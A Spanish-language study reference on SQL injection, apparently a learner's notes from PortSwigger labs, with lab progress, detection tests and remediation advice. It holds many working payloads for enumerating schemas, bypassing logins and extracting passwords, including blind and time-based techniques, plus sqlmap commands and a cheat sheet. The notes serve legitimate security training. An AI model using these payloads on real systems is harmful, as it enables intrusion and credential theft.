# 💉 SQL Injection — Referencia completa

> Mi guía de referencia de inyección SQL: qué es, cómo detectarla, todas las
> técnicas con sus payloads, y cómo se defiende. Documento de consulta: no hay
> que memorizarlo, se mira cuando se necesita (como hace un profesional).
> Basado en los labs de PortSwigger Web Security Academy.

**Nivel OWASP:** Injection — históricamente top 1-3 del OWASP Top 10.
**Última actualización:** 2026-11-26

---

## 📊 Mi progreso en los labs (PortSwigger Web Security Academy)

**Resueltos: 15 / 18** · actualizado 2026-11-26
(A = Apprentice · P = Practitioner)

### ✅ Resueltos (15)
- [x] (A) SQLi en cláusula WHERE — recuperación de datos ocultos
- [x] (A) SQLi — login bypass
- [x] (P) Averiguar tipo y versión de BD — Oracle
- [x] (P) Averiguar tipo y versión de BD — MySQL y Microsoft
- [x] (P) Listar contenido de la BD — bases de datos no-Oracle
- [x] (P) Listar contenido de la BD — Oracle
- [x] (P) UNION — averiguar el número de columnas
- [x] (P) UNION — encontrar una columna con texto
- [x] (P) UNION — recuperar datos de otras tablas
- [x] (P) UNION — recuperar varios valores en una sola columna
- [x] (P) Blind — respuestas condicionales
- [x] (P) Blind — errores condicionales
- [x] (P) Visible error-based
- [x] (P) Blind — retardos de tiempo (time delays)   🆕
- [x] (P) Blind — time delays + extracción de datos   🆕 (script `extraer_password_time.py`)

### ⬜ Pendientes (3)
- [ ] (P) Filter bypass vía XML encoding   ← se puede hacer (Burp Community + Hackvertor)
- [ ] (P) Blind — out-of-band (interacción)   ⚠️ necesita Burp Pro (Collaborator)
- [ ] (P) Blind — out-of-band (exfiltración)   ⚠️ necesita Burp Pro

---

## 1 · Qué es y por qué es crítica

Una inyección SQL ocurre cuando una aplicación mete **datos del usuario
directamente dentro de una consulta SQL**, sin separarlos del código. El atacante
escribe SQL en un campo (un buscador, un login, un parámetro de URL) y la base de
datos lo **ejecuta como si fuera parte de la consulta**.

**Impacto:** leer datos de otros usuarios, saltarse logins, extraer toda la base
de datos (credenciales, tarjetas...), y en casos graves ejecutar comandos en el
servidor. Por eso es de las vulnerabilidades más peligrosas.

---

## 2 · Cómo detectarla

En cada parámetro (URL, formulario, cabecera, cookie) prueba:

| Prueba | Qué buscar |
|---|---|
| `'` (una comilla simple) | ¿Error de SQL o cambio raro? → posible SQLi |
| `''` (dos comillas) | Si el error desaparece → confirma SQLi |
| `' OR 1=1--` | ¿Devuelve de más (todo)? |
| `' AND 1=2--` vs `' AND 1=1--` | Si cambian la respuesta → inyectable |

---

## 3 · Técnicas (con payloads)

### 3.1 · Recuperar datos ocultos (cláusula WHERE)
**Lab:** *SQL injection in WHERE clause allowing retrieval of hidden data.*

La web filtra: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

```
Gifts'--
```
El `'` cierra el texto, `--` comenta el resto → desaparece `AND released = 1` →
se ven los productos ocultos.

Para ver **TODO** (todas las categorías):
```
Gifts' OR 1=1--
```

### 3.2 · Saltarse el login (login bypass)
**Lab:** *SQL injection allowing login bypass.*

Login: `SELECT * FROM users WHERE username = 'admin' AND password = '...'`

En el campo **usuario** escribe:
```
administrator'--
```
Comenta la comprobación de la contraseña → entras como administrator sin saber
su clave.

### 3.3 · Averiguar el nº de columnas (para ataques UNION)
Antes de un UNION necesitas saber cuántas columnas devuelve la consulta.

**Método A — ORDER BY** (incrementa hasta que dé error):
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   <- si falla aquí, hay 2 columnas
```

**Método B — UNION SELECT NULL** (añade NULL hasta que NO dé error):
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
> En **Oracle** toda consulta necesita un FROM: usa `FROM DUAL`:
> `' UNION SELECT NULL FROM DUAL--`

### 3.4 · Encontrar una columna que acepte texto
Para volcar datos (que son texto) necesitas una columna de tipo texto. Prueba
poniendo una cadena en cada posición:
```
' UNION SELECT 'abc',NULL--
' UNION SELECT NULL,'abc'--
```
La que muestre `abc` en la página es la buena.

### 3.5 · Averiguar tipo y versión de la base de datos
**Labs:** *querying the database type and version on Oracle / MySQL / Microsoft.*

| Base de datos | Payload |
|---|---|
| Microsoft / MySQL | `' UNION SELECT @@version,NULL--` |
| Oracle | `' UNION SELECT banner,NULL FROM v$version--` |
| PostgreSQL | `' UNION SELECT version(),NULL--` |

> ⚠️ **MySQL** necesita un espacio tras `--`. Usa `-- -` o el comentario `#`.

### 3.6 · Listar tablas y columnas
**Tablas:**
```
' UNION SELECT table_name,NULL FROM information_schema.tables--   (MySQL/MSSQL/PostgreSQL)
' UNION SELECT table_name,NULL FROM all_tables--                  (Oracle)
```
**Columnas de una tabla (ej. 'users'):**
```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--   (Oracle, en MAYÚSCULAS)
```

### 3.7 · Extraer las credenciales
```
' UNION SELECT username, password FROM users--
```
Si solo tienes **una** columna útil, concatena los dos campos en una:

| Base de datos | Concatenación |
|---|---|
| Oracle / PostgreSQL | `username || '~' || password` |
| Microsoft | `username + '~' + password` |
| MySQL | `CONCAT(username,'~',password)` |

Ejemplo (Oracle/PostgreSQL):
```
' UNION SELECT username || '~' || password, NULL FROM users--
```

### 3.8 · Blind SQL Injection (a ciegas)
Cuando la web **no devuelve** el resultado de la consulta. La clave es encontrar
un **"semáforo"**: algo observable que cambie según si tu condición es verdadera
o falsa. Con él, preguntas sí/no y sacas los datos **letra a letra**.

**a) Respuestas condicionales — el semáforo es un TEXTO** (BD: PostgreSQL)
La web muestra un mensaje (p.ej. "Welcome back") solo si la consulta devuelve fila.
```
Verdadero/falso:  TrackingId=xyz' AND '1'='1      (vs '1'='2)
Longitud:         ' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>N
Carácter:         ' AND (SELECT SUBSTRING(password,N,1) FROM users WHERE username='administrator')='a
```
Semáforo: 🟢 aparece "Welcome back" = verdadero · 🔴 no aparece = falso.

**b) Errores condicionales — el semáforo es un ERROR 500** (BD: Oracle)
No hay texto ni errores visibles, pero puedes FORZAR un error (división por cero)
solo si la condición es cierta. Oracle → `SUBSTR`, `dual`, `||`.
```
' || (SELECT CASE WHEN (CONDICION) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
Carácter:  CASE WHEN SUBSTR(password,N,1)='a' THEN TO_CHAR(1/0) ELSE '' END
           ... FROM users WHERE username='administrator'
```
Semáforo: 🟢 HTTP 500 = verdadero · 🔴 HTTP 200 = falso.

**c) Visible error-based — el dato VIAJA DENTRO del error** (de un solo tiro)
La web muestra el error de la BD. Forzamos un error de conversión con CAST, y el
error incluye el dato (sin ir letra a letra).
```
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
-> ERROR: invalid input syntax for type integer: <la contraseña>
```
⚠️ Gotcha: la cookie se **trunca** (límite de longitud). Hay que **borrar el valor
aleatorio** del TrackingId para que el payload quepa.

**d) Por tiempo (time-based) — el semáforo es el RETARDO**
Si no hay ni texto ni error observable, metes un retardo que ocurre solo si la
condición es cierta, y mides cuánto tarda la respuesta.
```
PostgreSQL:  ' AND (SELECT CASE WHEN (CONDICION) THEN pg_sleep(5) ELSE pg_sleep(0) END)='' 
MySQL:       SLEEP(5)        Microsoft:  WAITFOR DELAY '0:0:5'
```

**e) Out-of-band (OOB)** — fuerzas a la BD a conectarse a un servidor tuyo
(DNS/HTTP) para filtrar datos. Necesita **Burp Collaborator (Burp Pro)**.

> **Automatización:** para no sacar los datos a mano se usa un **script** (mis
> `extraer_password_blind.py`, `extraer_password_errores.py`, `extraer_visible_error.py`)
> o **sqlmap**. La lógica siempre es la misma; solo cambia el semáforo y la sintaxis.

---

## 4 · Herramienta: sqlmap
Automatiza la detección y explotación:
```
sqlmap -u "http://objetivo/filter?category=Gifts" -p category --batch --dbs
sqlmap -u "..." --cookie="session=..." -p id --dump
```
> Úsalo SOLO en labs o con autorización. En un pentest real, primero entiende el
> fallo a mano; sqlmap es para acelerar, no para pensar por ti.

---

## 5 · Cómo se arregla (remediación) — la parte de senior
- **Consultas parametrizadas (prepared statements):** la defensa nº1. Separan el
  código SQL de los datos, así la entrada del usuario NUNCA se ejecuta como SQL.
  ```sql
  -- MAL (vulnerable):
  "SELECT * FROM products WHERE category = '" + input + "'"
  -- BIEN (parametrizado):
  "SELECT * FROM products WHERE category = ?"   // el input va aparte
  ```
- **Validación de entrada** (listas blancas donde se pueda).
- **Mínimos privilegios** en la cuenta de BD (que no pueda leerlo todo).
- **No mostrar errores SQL** al usuario.

---

## 6 · Chuleta rápida de payloads
```
'                         -> probar si es inyectable
Gifts'--                  -> datos ocultos
Gifts' OR 1=1--           -> sacar todo
administrator'--          -> login bypass (en el campo usuario)
' ORDER BY N--            -> contar columnas
' UNION SELECT NULL,NULL---> contar columnas (método 2)
' UNION SELECT @@version,NULL--              -> versión (MySQL/MSSQL)
' UNION SELECT banner,NULL FROM v$version--  -> versión (Oracle)
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT username||'~'||password,NULL FROM users--
```

> Recordatorio ético: todo esto SOLO en labs o con autorización escrita.
